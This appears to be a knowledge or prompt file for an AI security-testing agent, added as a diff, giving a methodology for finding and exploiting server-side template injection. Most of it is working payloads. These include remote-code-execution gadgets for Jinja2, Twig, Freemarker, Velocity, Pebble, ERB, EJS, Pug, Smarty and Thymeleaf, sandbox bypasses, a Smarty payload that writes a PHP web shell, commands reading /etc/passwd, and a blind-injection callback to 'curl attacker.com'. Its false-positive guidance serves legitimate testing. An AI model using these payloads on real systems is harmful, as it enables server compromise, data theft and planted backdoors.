@@ -1,0 +1,328 @@
+<ssti_vulnerability_guide>
+<title>SERVER-SIDE TEMPLATE INJECTION (SSTI)</title>
+
+<critical>Server-side template injection occurs when user input is embedded directly into template code and executed by the template engine. This typically leads to remote code execution (RCE) as template engines often provide access to underlying language features. SSTI is critical severity due to direct server compromise potential.</critical>
+
+<scope>
+- Python: Jinja2, Mako, Tornado, Django templates
+- Java: Freemarker, Velocity, Thymeleaf, Pebble
+- PHP: Twig, Smarty, Blade
+- JavaScript: Pug (Jade), EJS, Handlebars, Nunjucks
+- Ruby: ERB, Slim, Haml
+- .NET: Razor (limited), DotLiquid
+- Go: text/template, html/template
+</scope>
+
+<methodology>
+1. Identify template usage: Look for templating patterns in responses, errors, or documentation.
+2. Test for reflection: Inject basic template syntax to see if it's evaluated.
+3. Identify the engine: Use engine-specific polyglot payloads.
+4. Confirm code execution: Move from math expressions to actual code execution.
+5. Achieve RCE: Use engine-specific gadgets to execute system commands.
+6. Document the complete chain from detection to RCE.
+</methodology>
+
+<discovery_techniques>
+<identify_templating>
+- URL parameters reflected in page with special formatting
+- Error messages mentioning template engines (Jinja2, Freemarker, etc.)
+- Custom error pages with dynamic content
+- Email templates, PDF generation, report builders
+- CMS platforms with theme customization
+- Any feature allowing text customization that gets rendered
+</identify_templating>
+
+<detection_payloads>
+Universal math test (works on most engines):
+- `{{7*7}}` → 49 (Jinja2, Twig, Nunjucks)
+- `${7*7}` → 49 (Freemarker, Velocity, EL)
+- `<%= 7*7 %>` → 49 (ERB, EJS)
+- `#{7*7}` → 49 (Ruby interpolation, Pug)
+- `{7*7}` → 49 (Smarty)
+- `{{= 7*7}}` → 49 (Mustache with code)
+
+Polyglot detection:
+- `${{<%[%'"}}%\.`
+- `{{constructor.constructor('return this')()}}`
+</detection_payloads>
+
+<engine_fingerprinting>
+Identify specific engine:
+- `{{7*'7'}}` → 7777777 (Jinja2), 49 (Twig)
+- `{{_self.env.registerUndefinedFilterCallback("exec")}}` → Twig
+- `<#assign x=7*7>${x}` → Freemarker
+- `${T(java.lang.Runtime).getRuntime()}` → Spring EL
+- `@(1+1)` → Razor
+</engine_fingerprinting>
+</discovery_techniques>
+
+<engine_specific_payloads>
+<jinja2>
+Detection:
+{% raw %}{{7*7}}{% endraw %}
+{% raw %}{{config}}{% endraw %}
+{% raw %}{{self.__class__}}{% endraw %}
+
+RCE payloads:
+{% raw %}{{config.__class__.__init__.__globals__['os'].popen('id').read()}}{% endraw %}
+
+{% raw %}{{''.__class__.__mro__[1].__subclasses__()[xxx]('id',shell=True,stdout=-1).communicate()}}{% endraw %}
+(xxx = index of subprocess.Popen, typically around 200-400)
+
+{% raw %}{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}{% endraw %}
+
+{% raw %}{{lipsum.__globals__['os'].popen('id').read()}}{% endraw %}
+</jinja2>
+
+<twig>
+Detection:
+{% raw %}{{7*7}}{% endraw %}
+{% raw %}{{_self}}{% endraw %}
+
+RCE (Twig 1.x):
+{% raw %}{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}{% endraw %}
+
+RCE (Twig 2.x/3.x with filter):
+{% raw %}{{['id']|filter('system')}}{% endraw %}
+{% raw %}{{['cat /etc/passwd']|filter('exec')}}{% endraw %}
+</twig>
+
+<freemarker>
+Detection:
+${7*7}
+<#assign x=7*7>${x}
+${.version}
+
+RCE:
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+
+${"freemarker.template.utility.Execute"?new()("id")}
+</freemarker>
+
+<velocity>
+Detection:
+$class.inspect("java.lang.Runtime")
+#set($x=7*7)$x
+
+RCE:
+#set($rt=$class.inspect("java.lang.Runtime").type.getRuntime())
+#set($proc=$rt.exec("id"))
+#set($out=$proc.getInputStream())
+#foreach($i in [1..$out.available()])$chr.toChars($out.read())#end
+</velocity>
+
+<pebble>
+Detection:
+{{7*7}}
+{{beans}}
+
+RCE:
+{% raw %}{{ beans.get("java.lang.Runtime").exec("id") }}{% endraw %}
+</pebble>
+
+<erb>
+Detection:
+<%= 7*7 %>
+<%= self %>
+
+RCE:
+<%= system("id") %>
+<%= `id` %>
+<%= IO.popen("id").read %>
+</erb>
+
+<pug_jade>
+Detection:
+#{7*7}
+=7*7
+
+RCE (if code execution available):
+- require('child_process').execSync('id')
+#{function(){return global.process.mainModule.require('child_process').execSync('id')}()}
+</pug_jade>
+
+<ejs>
+Detection:
+<%= 7*7 %>
+
+RCE:
+<%= global.process.mainModule.require('child_process').execSync('id').toString() %>
+</ejs>
+
+<smarty>
+Detection:
+{7*7}
+{$smarty.version}
+
+RCE (older versions):
+{php}system('id');{/php}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['cmd']); ?>",self::clearConfig())}
+</smarty>
+
+<thymeleaf>
+Detection:
+${7*7}
+${T(java.lang.System).getenv()}
+
+RCE:
+${T(java.lang.Runtime).getRuntime().exec('id')}
+</thymeleaf>
+</engine_specific_payloads>
+
+<exploitation>
+<detection_to_rce_flow>
+1. Test basic math: `{{7*7}}` or `${7*7}`
+2. If evaluated, fingerprint engine with engine-specific syntax
+3. Access object introspection: `{{self.__class__}}`, `${.class}`
+4. Navigate to dangerous classes: `__globals__`, `Runtime`, `exec`
+5. Execute system command: `os.popen()`, `Runtime.exec()`
+6. Extract output and document full chain
+</detection_to_rce_flow>
+
+<sandbox_bypass>
+Some engines have sandboxes - common bypasses:
+- Jinja2: Use `lipsum`, `cycler`, `joiner` globals to reach `os`
+- Twig: Use `filter` filter with system functions
+- Freemarker: Use `?new()` with Execute class
+- Access internal objects via class introspection
+</sandbox_bypass>
+
+<blind_ssti>
+When output not visible:
+- Time-based: `{{sleep(5)}}`, `${T(java.lang.Thread).sleep(5000)}`
+- DNS/HTTP callback: `{{''.__class__.__mro__[1].__subclasses__()[xxx]('curl attacker.com',shell=True)}}`
+- Error-based: Trigger different errors based on conditions
+</blind_ssti>
+</exploitation>
+
+<validation>
+1. Demonstrate template syntax is evaluated (7*7=49), not just reflected.
+2. Confirm server-side execution, not client-side JavaScript templating.
+3. Progress from math to code execution for RCE confirmation.
+4. Show actual command output or callback to prove RCE.
+5. Document the specific template engine and payload chain.
+6. Verify reproducibility of the exploitation chain.
+</validation>
+
+<false_positives>
+- Client-side templating (Vue.js, Angular, React interpolation)
+- Math reflected but not evaluated (literal `{{7*7}}` in output)
+- Sandboxed template with no code execution path
+- Template syntax displayed but not processed
+- CMS preview modes showing raw template
+- Static file serving with template-like syntax
+</false_positives>
+
+<llm_reasoning_errors>
+COMMON AI MISTAKES THAT CAUSE FALSE POSITIVES - AVOID THESE:
+
+1. CLIENT-SIDE VS SERVER-SIDE:
+   WRONG: "Template syntax {{7*7}} evaluated to 49, SSTI confirmed"
+   RIGHT: Many frontend frameworks use similar syntax:
+          - Vue.js: {% raw %}{{ expression }}{% endraw %} evaluated CLIENT-SIDE
+          - Angular: {% raw %}{{ expression }}{% endraw %} evaluated CLIENT-SIDE
+          - React JSX: {expression} evaluated CLIENT-SIDE
+          Check if evaluation happens in BROWSER (view source) or SERVER (raw response).
+
+2. REFLECTION VS EXECUTION:
+   WRONG: "Template syntax appears in response, SSTI exists"
+   RIGHT: Seeing template syntax in output may mean:
+          - Template NOT processed (just echoed)
+          - Template escaped/sanitized
+          - Display-only context
+          Confirm EVALUATION (7*7 → 49), not just reflection ({{7*7}} → {{7*7}}).
+
+3. MATH EXECUTION VS RCE:
+   WRONG: "7*7 evaluated to 49, RCE possible"
+   RIGHT: Template engines have different capability levels:
+          - Some only allow math/safe operations
+          - Sandboxes may prevent code execution
+          - RCE requires accessing dangerous classes/functions
+          Prove ACTUAL command execution, not just math.
+
+4. PREVIEW/EDIT MODE:
+   WRONG: "Template renders in admin panel, SSTI vulnerability"
+   RIGHT: Admin/editor interfaces may legitimately show templates:
+          - CMS preview modes
+          - Template editor functionality
+          - Design customization tools
+          Check if this is intended functionality for that user role.
+
+5. ERROR MESSAGE CONFUSION:
+   WRONG: "Error mentions Jinja2, SSTI confirmed"
+   RIGHT: Errors indicate technology, not vulnerability:
+          - Syntax errors may show engine name but input rejected
+          - Template compilation errors don't mean injection
+          - Framework errors unrelated to user input
+          Show successful template EXECUTION with controlled output.
+
+6. STATIC FILE INCLUSION:
+   WRONG: "Template syntax in HTML file, server processes templates"
+   RIGHT: Static files may contain template syntax but:
+          - Served directly without processing
+          - Template syntax is literal text
+          - No server-side evaluation occurs
+          Verify dynamic rendering, not static file serving.
+</llm_reasoning_errors>
+
+<expanded_false_positives>
+FALSE POSITIVE SCENARIOS - DO NOT REPORT:
+
+1. CLIENT-SIDE TEMPLATING:
+   - Vue.js {% raw %}{{ }}{% endraw %} interpolation
+   - Angular expressions
+   - React JSX
+   - Handlebars in browser
+   - Any JavaScript-evaluated templates
+
+2. TEMPLATE SYNTAX REFLECTION:
+   - Input echoed with template syntax visible but not evaluated
+   - Template escaped: {% raw %}{{7*7}}{% endraw %} shown as text
+   - HTML-encoded template characters
+
+3. SANDBOXED TEMPLATES:
+   - Jinja2 with sandbox enabled and properly configured
+   - Limited template engines (Mustache, logic-less)
+   - Restricted evaluation contexts
+
+4. INTENDED FUNCTIONALITY:
+   - CMS template editors for administrators
+   - Email template customization (with proper sandboxing)
+   - Report builder tools
+   - Admin-only template management
+
+5. NON-TEMPLATE MATH:
+   - Calculator features
+   - Spreadsheet formula evaluation
+   - Expression parsers (not template engines)
+
+6. DEVELOPMENT/DEBUG:
+   - Debug mode showing template internals
+   - Development error pages
+   - Template syntax in documentation
+</expanded_false_positives>
+
+<impact>
+- Remote code execution (RCE): Full server compromise
+- Sensitive data access: Read configuration, credentials, source code
+- Server-side request forgery: Make requests from server
+- File system access: Read/write files on server
+- Denial of service: Resource exhaustion via template loops
+- Privilege escalation: Access to application internals
+</impact>
+
+<pro_tips>
+1. Always check view-source to distinguish client-side vs server-side templating.
+2. Jinja2 sandbox bypasses evolve constantly - check recent research.
+3. Use `{{config}}` or `${beans}` to leak internal state before attempting RCE.
+4. Freemarker's `?new()` builtin is often the key to RCE.
+5. Twig's `filter` filter can turn any PHP function into a template filter.
+6. For blind SSTI, use time delays or out-of-band callbacks.
+7. Check for second-order SSTI: input stored then rendered later.
+8. Some engines require specific syntaxes: `${...}` vs `{{...}}` vs `<%= %>`.
+9. Class index for Jinja2 Popen varies by Python version - enumerate subclasses.
+10. Document the full chain: detection → engine ID → sandbox bypass → RCE.
+</pro_tips>
+
+<remember>SSTI requires demonstrating server-side template evaluation, not just syntax reflection. Progress from basic math evaluation to actual code execution. Client-side JavaScript templating (Vue, Angular, React) is NOT SSTI. Always verify the evaluation happens server-side by checking the raw HTTP response.</remember>
+</ssti_vulnerability_guide>
